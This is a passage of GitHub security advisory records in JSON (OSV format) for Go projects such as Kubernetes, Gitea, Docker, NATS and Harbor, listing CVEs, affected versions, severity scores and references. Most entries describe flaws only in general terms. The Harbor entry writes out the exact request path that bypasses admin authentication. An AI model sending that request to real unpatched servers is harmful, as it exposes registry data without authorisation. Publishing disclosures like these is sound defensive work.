not be affected. We still strongly recommend upgrading.\n\n### References\n_Are there any links users can visit to find out more?_\n\nThis problem was initially found and reported by the team at Supabase: https://github.com/supabase/gotrue/security/advisories/GHSA-5hvv-9cqv-894r. We want to thank them for the cooperation around this report.\n\nIn contrast to their advisory, we decided to set the severity to \"Moderate\" since the provider metadata is not an inherent security feature of this GoTrue codebase or the Netlify ecosystem.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@netlify.com](mailto:security@netlify.com)\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/netlify/gotrue"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/netlify/gotrue/security/advisories/GHSA-wpfr-6297-9v57"}, {"type": "WEB", "url": "https://github.com/netlify/gotrue/pull/313"}, {"type": "WEB", "url": "https://github.com/netlify/gotrue/commit/4d8a3b39fe485a5f83c70617d594be01130c5b83"}, {"type": "PACKAGE", "url": "https://github.com/netlify/gotrue"}, {"type": "WEB", "url": "https://github.com/netlify/gotrue/releases/tag/v1.0.1"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-02-09T22:29:01Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-g6w6-r76c-28j7", "modified": "2023-08-08T20:44:45Z", "published": "2022-02-08T17:23:16Z", "aliases": ["CVE-2022-24450"], "summary": "Incorrect Authorization in NATS nats-server", "details": "(This advisory is canonically <https://advisories.nats.io/CVE/CVE-2022-24450.txt>)\n\n## Problem Description\n\nNATS nats-server through 2022-02-04 has Incorrect Access Control, with unchecked ability for clients to authorize into any account, because of a coding error in a long-extant experimental feature.\n\nA client crafting the initial protocol-level handshake could, with valid credentials for any account, specify a target account and switch into it immediately.  This includes any other tenant, and includes the System account which controls nats-server core operations.\n\nFor deployments not using multi-tenancy through NATS Accounts, there is still a vulnerability: normal users are able to choose to be in the System account.\n\nAn experimental feature to provide dynamically provisioned sandbox accounts was designed to allow a server administrator to turn on an option to allow clients to dynamically request a brand new account inline at connection time.  This feature went nowhere, but lived on in the code and was used by a number of tests; support was never added to any client libraries or to the documentation.\n\nA bug in handling the feature meant that if someone did in fact have valid account credentials, then they could specify any other existing account and they would be assigned into that account.\n\nRelease 2.7.2 of nats-server removes the feature.\nBecause of the lack of client support and absence from protocol documentation, we feel this is safe operationally as well as the safest fix for the code.\n\n\n## Affected versions\n\n#### NATS Server\n * All 2.x versions up to and including 2.7.1.\n * Fixed with nats-io/nats-server: 2.7.2\n * NATS Server 1.x did not have accounts.\n * Docker image:  nats <https://hub.docker.com/_/nats>\n\n#### NATS Streaming Server\n * All versions embedding affected NATS Server:\n   + Affected: v0.15.0 up to and including v0.24.0\n   + Fixed with nats-io/nats-streaming-server: 0.24.1\n * Docker image:  nats-streaming <https://hub.docker.com/_/nats-streaming>\n\n\n## Impact\n\nExisting users could act in any account, including the System account.\n\n## Workaround\n\nNone.\n\n## Solution\n\nUpgrade the NATS server.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.7.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-streaming-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.15.0"}, {"fixed": "0.24.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/nats-io/nats-server/security/advisories/GHSA-g6w6-r76c-28j7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24450"}, {"type": "WEB", "url": "https://advisories.nats.io/CVE/CVE-2022-24450.txt"}, {"type": "PACKAGE", "url": "https://github.com/nats-io/nats-server"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/releases/tag/v2.7.2"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-08T17:23:16Z", "nvd_published_at": "2022-02-08T02:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pg38-r834-g45j", "modified": "2022-09-08T00:01:33Z", "published": "2022-02-10T00:00:20Z", "aliases": ["CVE-2021-45330"], "summary": "Improper Privilege Management in Gitea", "details": "An issue exsits in Gitea through 1.15.7, which could let a malicious user gain privileges due to client side cookies not being deleted and the session remains valid on the server side for reuse.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-45330"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/issues/4336"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/4840"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-09-08T00:01:33Z", "nvd_published_at": "2022-02-09T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x6mj-w4jf-jmgw", "modified": "2023-09-18T22:44:56Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-8555"], "summary": "Server Side Request Forgery (SSRF) in Kubernetes", "details": "The Kubernetes kube-controller-manager in versions v1.0-1.14, versions prior to v1.15.12, v1.16.9, v1.17.5, and version v1.18.0 are vulnerable to a Server Side Request Forgery (SSRF) that allows certain authorized users to leak up to 500 bytes of arbitrary information from unprotected endpoints within the master's host network (such as link-local or loopback services).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.18.0"}, {"fixed": "1.18.1"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.17.0"}, {"fixed": "1.17.4"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.16.0"}, {"fixed": "1.16.9"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.15.12"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8555"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/91542"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/89794"}, {"type": "WEB", "url": "https://groups.google.com/d/topic/kubernetes-security-announce/kEK27tqqs30/discussion"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3SOCLOPTSYABTE4CLTSPDIFE6ZZZR4LX/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20200724-0005/"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2020/06/01/4"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2021/05/04/8"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-13T20:13:43Z", "nvd_published_at": "2020-06-05T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-579h-mv94-g4gp", "modified": "2021-05-20T20:40:04Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2018-1002105"], "summary": "Privilege Escalation in Kubernetes", "details": "In all Kubernetes versions prior to v1.10.11, v1.11.5, and v1.12.3, incorrect handling of error responses to proxied upgrade requests in the kube-apiserver allowed specially crafted requests to establish a connection through the Kubernetes API server to backend servers, then send arbitrary requests over the same connection directly to the backend, authenticated with the Kubernetes API server's TLS credentials used to establish the backend connection.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1002105"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/71411"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/2257c1ecbe3c0cf71dd50b82752ae189c94ec905"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:3537"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:3549"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:3551"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:3598"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:3624"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:3742"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:3752"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:3754"}, {"type": "WEB", "url": "https://github.com/evict/poc_CVE-2018-1002105"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/kubernetes-announce/GVllWCg6L88"}, {"type": "WEB", "url": "https://lists.opensuse.org/opensuse-security-announce/2020-04/msg00041.html"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20190416-0001/"}, {"type": "WEB", "url": "https://www.coalfire.com/The-Coalfire-Blog/December-2018/Kubernetes-Vulnerability-What-You-Can-Should-Do"}, {"type": "WEB", "url": "https://www.exploit-db.com/exploits/46052/"}, {"type": "WEB", "url": "https://www.exploit-db.com/exploits/46053"}, {"type": "WEB", "url": "https://www.exploit-db.com/exploits/46053/"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2019/06/28/2"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2019/07/06/3"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2019/07/06/4"}, {"type": "WEB", "url": "https://www.securityfocus.com/bid/106068"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:40:04Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-xx8c-m748-xr4j", "modified": "2023-10-02T11:33:50Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2016-1905"], "summary": "Access Restriction Bypass in kubernetes", "details": "The API server in Kubernetes does not properly check admission control, which allows remote authenticated users to access additional resources via a crafted patched object.\n\n### Specific Go Packages Affected\ngithub.com/kubernetes/kubernetes/pkg/apiserver", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.0-alpha.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.2.0-alpha.5"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-1905"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/19479"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/9e6912384a5bc714f2a780b870944a8cee264a22"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2016:0070"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2016:0351"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2016-1905"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1297910"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-07T20:51:03Z", "nvd_published_at": "2016-02-03T18:59:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qrrc-ww9x-r43g", "modified": "2023-03-02T20:00:40Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-13401"], "summary": "Improper Input Validation in Docker Engine", "details": "An issue was discovered in Docker Engine before 19.03.11. An attacker in a container, with the CAP_NET_RAW capability, can craft IPv6 router advertisements, and consequently spoof external IPv6 hosts, obtain sensitive information, or cause a denial of service.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker-ce"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "19.03.11"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-13401"}, {"type": "WEB", "url": "https://docs.docker.com/engine/release-notes/"}, {"type": "WEB", "url": "https://github.com/docker/docker-ce/releases/tag/v19.03.11"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DN4JQAOXBE3XUNK3FD423LHE3K74EMJT/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KJZLKRCOJMOGUIJI2AS27BOZS3RBEF3K/"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202008-15"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20200717-0002/"}, {"type": "WEB", "url": "https://www.debian.org/security/2020/dsa-4716"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-06/msg00040.html"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2020/06/01/5"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-14T16:27:26Z", "nvd_published_at": "2020-06-02T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-38r5-34mr-mvm7", "modified": "2022-02-12T00:01:51Z", "published": "2022-02-12T00:01:51Z", "aliases": ["CVE-2020-29662"], "summary": "\"catalog's registry v2 api exposed on unauthenticated path in Harbor\"", "details": "### **Impact**\nJavier Provecho, member of the TCCT (Telefonica Cloud & Cybersecurity Tech better known as ElevenPaths) SRE team discovered a vulnerability regarding Harbor\u2019s v2 API.\n\nThe catalog\u2019s registry v2 api is exposed on an unauthenticated path. The current catalog API path is served at the following path and it requires to be authenticated as an admin.\n\n\"GET /v2/_catalog\"\n\nHowever, the authorization can be bypassed by using the following path\n\n\"GET /v2/_catalog/\"\n\n### **Patches**\nIf your product uses the affected releases of Harbor, update to either version v2.1.2 or v2.0.5 to fix this issue immediately\n\nhttps://github.com/goharbor/harbor/releases/tag/v2.1.2\nhttps://github.com/goharbor/harbor/releases/tag/v2.0.5\n\n### **Workarounds**\nIf you cannot access a patched release, it can be mitigated by disabling that API. For example, redirecting it to a 404 sink hole in the ingress.\n\n### **For more information**\nIf you have any questions or comments about this advisory, contact cncf-harbor-security@lists.cncf.io\nView our security policy at https://github.com/goharbor/harbor/security/policy\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-29662", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.1.0"}, {"fixed": "2.1.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-38r5-34mr-mvm7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-29662"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/pull/13676"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/commit/3481722f140e1fdf6e6d290b0cd5c86e509feed4"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/commit/c7c409a8e5a8b3fd42841dda84759c9d77977853"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/releases/tag/v2.0.5"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/releases/tag/v2.1.2"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-319"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T19:00:31Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-v4h8-794j-g8mm", "modified": "2021-05-19T22:04:37Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2015-3631"], "summary": "Arbitrary File Override in Docker Engine", "details": "Docker Engine before 1.6.1 allows local users to set arbitrary Linux Security Modules (LSM) and docker_t policies via an image that allows volumes to override files in /proc.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/moby/moby"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3631"}, {"type": "WEB", "url": "https://github.com/moby/moby/compare/769acfec2928c47a35da5357d854145b1036448d...b6a9dc399be31c531e3753104e10d74760ed75a2"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!searchin/docker-user/1.6.1/docker-user/47GZrihtr-4/nwgeOOFLexIJ"}, {"type": "WEB", "url": "https://groups.google.com/forum/#%21searchin/docker-user/1.6.1/docker-user/47GZrihtr-4/nwgeOOFLexIJ"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-3631"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-updates/2015-05/msg00023.html"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/131835/Docker-Privilege-Escalation-Information-Disclosure.html"}, {"type": "WEB", "url": "http://seclists.org/fulldisclosure/2015/May/28"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-19T22:04:37Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-hf6f-jq25-8gq9", "modified": "2023-09-15T18:13:45Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2018-18926"], "summary": "Gitea Remote Code Execution (RCE)", "details": "Gitea before 1.5.4 allows remote code execution because it does not properly validate session IDs. This is related to session ID handling in the go-macaron/session code for Macaron.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-18926"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/issues/5140"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/5177"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/commit/aeb5655c25053bdcd7eee94ea37df88468374162"}], "database_specific": {"cwe_ids": ["CWE-94"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-12T18:25:03Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-77cr-6gr8-7rr9", "modified": "2023-10-02T15:17:55Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-27195"], "summary": "Use After Free in HashiCorp Nomad", "details": "HashiCorp Nomad and Nomad Enterprise version 0.9.0 up to 0.12.5 client file sandbox feature can be subverted using either the template or artifact stanzas. Fixed in 0.12.6, 0.11.5, and 0.10.6", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.9.0"}, {"fixed": "0.10.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.11.0"}, {"fixed": "0.11.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.12.0"}, {"fixed": "0.12.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-27195"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/issues/9129"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/pull/9139"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/blob/master/CHANGELOG.md#0126-october-21-2020"}, {"type": "PACKAGE", "url": "https://pkg.go.dev/github.com/hashicorp/nomad/client/allocrunner/taskrunner/template"}, {"type": "WEB", "url": "https://www.nomadproject.io/downloads"}], "database_specific": {"cwe_ids": ["CWE-416"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:58:02Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-h5rh-w6vm-9ghc", "modified": "2023-10-02T13:18:04Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2021-27358"], "summary": "Denial of service in Grafana", "details": "The snapshot feature in Grafana before 7.4.2 can allow an unauthenticated remote attackers to trigger a Denial of Service via a remote API call if a commonly used configuration is set.\n### Specific Go Packages Affected\ngithub.com/grafana/grafana/pkg/middleware", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:U/RL:O/RC:R"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.7.3"}, {"fixed": "7.4.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-27358"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/pull/31263"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/blob/master/CHANGELOG.md"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/blob/master/CHANGELOG.md#742-2021-02-17"}, {"type": "WEB", "url": "https://grafana.com/docs/grafana/latest/release-notes/release-notes-7-4-2/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20210513-0007/"}], "database_specific": {"cwe_ids": ["CWE-306", "CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-14T17:47:34Z", "nvd_published_at": "2021-03-18T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8fvr-5rqf-3wwh", "modified": "2021-05-19T22:47:32Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2015-3630"], "summary": "Information Exposure in Docker Engine", "details": "Docker Engine before 1.6.1 uses weak permissions for (1) /proc/asound, (2) /proc/timer_stats, (3) /proc/latency_stats, and (4) /proc/fs, which allows local users to modify the host, obtain sensitive information, and perform protocol downgrade attacks via a crafted image.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/moby/moby"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.6.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3630"}, {"type": "WEB", "url": "https://github.com/moby/moby/commit/545b440a80f676a506e5837678dd4c4f65e78660"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!searchin/docker-user/1.6.1/docker-user/47GZrihtr-4/nwgeOOFLexIJ"}, {"type": "WEB", "url": "https://groups.google.com/forum/#%21searchin/docker-user/1.6.1/docker-user/47GZrihtr-4/nwgeOOFLexIJ"}, {"type": "WEB", "url": "https://lists.opensuse.org/opensuse-updates/2015-05/msg00023.html"}, {"type": "WEB", "url": "https://packetstormsecurity.com/files/131835/Docker-Privilege-Escalation-Information-Disclosure.html"}, {"type": "WEB", "url": "https://seclists.org/fulldisclosure/2015/May/28"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-3630"}, {"type": "WEB", "url": "https://www.securityfocus.com/bid/74566"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-19T22:47:32Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-cx3w-xqmc-84g5", "modified": "2022-04-20T16:24:41Z", "published": "2022-02-15T00:30:37Z", "aliases": ["CVE-2021-21237"], "summary": "Git LFS can execute a Git binary from the current directory on Windows", "details": "### Impact\nOn Windows, if Git LFS operates on a malicious repository with a git.bat or git.exe file in the current directory, that program would be executed, permitting the attacker to execute arbitrary code. This does not affect Unix systems.\n\nThis is the result of an incomplete fix for CVE-2020-27955.\n\nThis issue occurs because on Windows, [Go includes (and prefers) the current directory when the name of a command run does not contain a directory separator](https://github.com/golang/go/issues/38736).\n\n### Patches\nThis version should be patched in v2.13.2, which will be released in coordination with this security advisory.\n\n### Workarounds\nOther than avoiding untrusted repositories or using a different operating system, there is no workaround.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Start a discussion in [the Git LFS discussion page](https://github.com/git-lfs/git-lfs/discussions).\n- If you cannot open a discussion, please email the core team using their usernames at `github.com`.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/git-lfs/git-lfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.13.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/git-lfs/git-lfs/security/advisories/GHSA-cx3w-xqmc-84g5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-21237"}, {"type": "WEB", "url": "https://github.com/git-lfs/git-lfs/commit/fc664697ed2c2081ee9633010de0a7f9debea72a"}, {"type": "WEB", "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27955"}, {"type": "PACKAGE", "url": "https://github.com/git-lfs/git-lfs"}, {"type": "WEB", "url": "https://github.com/git-lfs/git-lfs/releases/tag/v2.13.2"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0098"}], "database_specific": {"cwe_ids": ["CWE-426", "CWE-94"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-21T17:37:52Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-x4rg-4545-4w7w", "modified": "2021-11-03T14:59:45Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2019-3564"], "summary": "Improper Input Validation and Excessive Iteration in Go Facebook Thrift", "details": "Go Facebook Thrift servers would not error upon receiving messages with containers of fields of unknown type. As a result, malicious clients could send short messages which would take a long time for the server to parse, potentially leading to denial of service. This issue affects Facebook Thrift prior to v2019.03.04.00.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/facebook/fbthrift"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.31.1-0.20190225164308-c461c1bd1a3e"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-3564"}, {"type": "WEB", "url": "https://github.com/facebook/fbthrift/commit/c461c1bd1a3e130b181aa9c854da3030cd4b5156"}, {"type": "PACKAGE", "url": "https://github.com/facebook/fbthrift"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rd0e44e8ef71eeaaa3cf3d1b8b41eb25894372e2995ec908ce7624d26@%3Ccommits.pulsar.apache.org%3E"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0088"}, {"type": "WEB", "url": "https://www.facebook.com/security/advisories/cve-2019-3564"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-755", "CWE-834"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T15:32:10Z", "nvd_published_at": "2019-05-06T16:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2575-pghm-6qqx", "modified": "2023-09-18T20:18:54Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2019-11244"], "summary": "Kubernetes Unsafe Cacheing ", "details": "In 